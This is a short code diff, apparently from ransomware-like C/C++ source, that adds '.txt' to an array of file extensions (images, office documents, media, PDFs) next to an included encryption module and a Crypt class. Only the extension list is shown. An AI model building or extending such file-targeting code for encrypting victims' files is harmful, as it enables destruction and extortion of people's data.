@@ -12,8 +12,8 @@ extern "C" {
 #include "encrypt.h"
 
 char *const extensions[] = {".jpg", ".gif", ".jpeg", ".png", ".doc", ".docx", ".xls",
-      ".xlsx", ".ppt", ".pptx", ".mp3", ".mp4", ".pdf"};
-const int extensionsSize = 13;
+      ".xlsx", ".ppt", ".pptx", ".mp3", ".mp4", ".pdf", ".txt"};
+const int extensionsSize = 14;
 const int descriptors = 10;
 
 Crypt *Crypt::current = NULL;
